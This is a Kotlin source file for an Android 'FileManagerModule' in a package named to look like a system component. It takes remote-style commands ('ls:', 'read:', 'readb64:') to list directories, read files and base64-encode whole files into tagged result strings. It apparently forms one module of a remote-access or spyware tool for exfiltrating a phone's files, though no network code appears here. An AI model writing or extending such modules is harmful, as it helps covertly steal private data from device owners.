package com.android.modules

import android.content.Context
import android.os.Environment
import android.util.Base64
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

/** FileManagerModule — list directory / read file content */
class FileManagerModule {
    fun execute(ctx: Context, command: String, extra: String?): Pair<String, String> = when {
        command.startsWith("ls:")      -> Pair(listDir(command.substringAfter("ls:")), "command_result")
        command.startsWith("read:")    -> Pair(readFile(command.substringAfter("read:")), "command_result")
        command.startsWith("readb64:") -> Pair(readB64(command.substringAfter("readb64:")), "command_result")
        else -> Pair(listDir(Environment.getExternalStorageDirectory().absolutePath), "command_result")
    }

    private fun listDir(path: String): String {
        return try {
            val dir = File(path.trim())
            if (!dir.exists()) return "⚠️ Not found: $path"
            if (dir.isFile) return readFile(path)
            val fmt   = SimpleDateFormat("MM-dd HH:mm", Locale.getDefault())
            val items = dir.listFiles() ?: return "⚠️ Cannot list (permission denied?)"
            val sb    = StringBuilder("=== ${dir.absolutePath} (${items.size} items) ===\n")
            items.sortedWith(compareBy({ !it.isDirectory }, { it.name })).forEach { f ->
                val size = if (f.isFile) size(f.length()) else "<DIR>"
                sb.appendLine("${if (f.isDirectory) "📁" else "📄"} ${f.name} | $size | ${fmt.format(Date(f.lastModified()))}")
            }
            sb.toString()
        } catch (e: Exception) { "Error: ${e.message}" }
    }

    private fun readFile(path: String): String {
        val f = File(path.trim())
        if (!f.exists()) return "⚠️ File not found"
        if (f.length() > 512 * 1024) return "⚠️ File too large (${size(f.length())}). Use readb64:"
        return try { f.readText() } catch (e: Exception) { "Error: ${e.message}" }
    }

    private fun readB64(path: String): String {
        val f = File(path.trim())
        if (!f.exists()) return "⚠️ File not found"
        return try { "FILE_B64|${f.length()}|${f.name}|${Base64.encodeToString(f.readBytes(), Base64.NO_WRAP)}" }
        catch (e: Exception) { "Error: ${e.message}" }
    }

    private fun size(b: Long) = when {
        b < 1024       -> "${b}B"
        b < 1024*1024  -> "${b / 1024}KB"
        else           -> "${b / (1024*1024)}MB"
    }
}
